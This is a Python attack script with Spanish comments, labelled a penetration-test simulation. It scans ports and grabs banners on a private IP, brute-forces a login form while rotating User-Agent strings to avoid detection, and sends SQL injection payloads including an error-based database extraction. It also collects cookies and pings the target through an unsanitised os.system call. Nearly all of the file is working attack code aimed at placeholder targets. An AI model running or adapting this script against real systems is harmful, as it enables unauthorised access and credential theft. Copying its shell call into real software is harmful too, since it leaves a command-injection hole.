import socket
import requests
import json
import logging
import os
import random
from urllib.parse import urlparse

# Configuración
TARGET_IP = '192.168.1.1'
PORTS = range(1, 1025)
BRUTE_FORCE_URL = 'http://example.com/login'
SQL_INJECTION_URL = 'http://example.com/search'
LOG_FILE = 'attack_simulation.log'
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0'
]

# Configuración de Registro
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_random_user_agent():
    return random.choice(USER_AGENTS)

# Escaneo de Puertos con Detección de Servicios
def port_scanner(target_ip):
    open_ports = []
    service_info = {}
    for port in PORTS:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    open_ports.append(port)
                    service_info[port] = get_service_info(target_ip, port)
        except Exception as e:
            logging.error(f"Error en el escaneo de puerto {port}: {e}")
    return open_ports, service_info

def get_service_info(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            sock.connect((ip, port))
            banner = sock.recv(1024).decode().strip()
            return banner
    except:
        return 'Desconocido'

# Ataque de Fuerza Bruta
def brute_force_login(url, user_list, pass_list):
    for user in user_list:
        for passwd in pass_list:
            try:
                response = requests.post(url, data={'username': user, 'password': passwd}, headers={'User-Agent': get_random_user_agent()})
                if 'Login successful' in response.text:
                    return user, passwd
            except Exception as e:
                logging.error(f"Error en el ataque de fuerza bruta: {e}")
    return None, None

# Prueba de Inyección SQL Avanzada
def advanced_sql_injection_test(url):
    payloads = [
        "' OR '1'='1' --",
        '" OR "1"="1" --',
        "' UNION SELECT NULL, NULL, NULL --",
        "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT DATABASE()), 0x7e, FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a) --"
    ]
    for payload in payloads:
        try:
            response = requests.get(url, params={'query': payload}, headers={'User-Agent': get_random_user_agent()})
            if 'error' in response.text.lower() or 'sql' in response.text.lower():
                return payload, response.text
        except Exception as e:
            logging.error(f"Error en la prueba de inyección SQL: {e}")
    return None, None

# Escaneo de Seguridad de Aplicaciones Web
def web_security_scan(url):
    try:
        response = requests.get(url, headers={'User-Agent': get_random_user_agent()})
        if response.status_code == 200:
            return "La aplicación web está accesible."
        else:
            return f"Estado HTTP: {response.status_code}"
    except Exception as e:
        logging.error(f"Error en el escaneo de seguridad de aplicaciones web: {e}")
        return "Error al acceder a la aplicación web."

# Escaneo de Vulnerabilidades
def vulnerability_scan(url):
    try:
        # Simulación de escaneo de vulnerabilidades
        response = requests.get(url, headers={'User-Agent': get_random_user_agent()})
        vulnerabilities = []
        if 'XSS' in response.text:
            vulnerabilities.append('Vulnerabilidad XSS detectada.')
        if 'SQL' in response.text:
            vulnerabilities.append('Vulnerabilidad SQL detectada.')
        return vulnerabilities
    except Exception as e:
        logging.error(f"Error en el escaneo de vulnerabilidades: {e}")
        return []

# Gestión de Sesiones y Cookies
def session_management(url):
    session = requests.Session()
    response = session.get(url, headers={'User-Agent': get_random_user_agent()})
    cookies = session.cookies.get_dict()
    return cookies

# Pruebas de Redes y Protocolos
def network_and_protocol_tests(target_ip):
    try:
        # Ping
        response = os.system(f"ping -c 1 {target_ip}")
        if response == 0:
            logging.info(f"{target_ip} está activo.")
        else:
            logging.info(f"{target_ip} no responde al ping.")
    except Exception as e:
        logging.error(f"Error en la prueba de red: {e}")

# Generación de Informes
def generate_report():
    with open(LOG_FILE, 'r') as log_file:
        log_data = log_file.read()
    with open('attack_simulation_report.txt', 'w') as report_file:
        report_file.write("Informe de Simulación de Ataques de Penetración\n")
        report_file.write("="*50 + "\n")
        report_file.write(log_data)

# Ejecución Principal
def main():
    print("Iniciando escaneo de puertos...")
    open_ports, service_info = port_scanner(TARGET_IP)
    logging.info(f"Puertos abiertos: {open_ports}")
    logging.info(f"Información de servicios: {json.dumps(service_info, indent=2)}")

    print("Iniciando ataque de fuerza bruta...")
    users = ['admin', 'user']
    passwords = ['123456', 'password']
    user, passwd = brute_force_login(BRUTE_FORCE_URL, users, passwords)
    if user and passwd:
        logging.info(f"Credenciales encontradas: Usuario: {user}, Contraseña: {passwd}")
    else:
        logging.info("No se encontraron credenciales válidas.")

    print("Iniciando prueba de inyección SQL...")
    payload, response = advanced_sql_injection_test(SQL_INJECTION_URL)
    if payload:
        logging.info(f"Inyección SQL detectada con payload: {payload}")
    else:
        logging.info("No se detectaron vulnerabilidades de inyección SQL.")

    print("Iniciando escaneo de seguridad de aplicaciones web...")
    security_status = web_security_scan(SQL_INJECTION_URL)
    logging.info(f"Estado de la aplicación web: {security_status}")

    print("Iniciando escaneo de vulnerabilidades...")
    vulnerabilities = vulnerability_scan(SQL_INJECTION_URL)
    if vulnerabilities:
        for vuln in vulnerabilities:
            logging.info(vuln)
    else:
        logging.info("No se detectaron vulnerabilidades.")

    print("Gestionando sesiones y cookies...")
    cookies = session_management(BRUTE_FORCE_URL)
    logging.info(f"Cookies gestionadas: {cookies}")

    print("Pruebas de redes y protocolos...")
    network_and_protocol_tests(TARGET_IP)

    print("Generando informe...")
    generate_report()

if __name__ == '__main__':
    main()
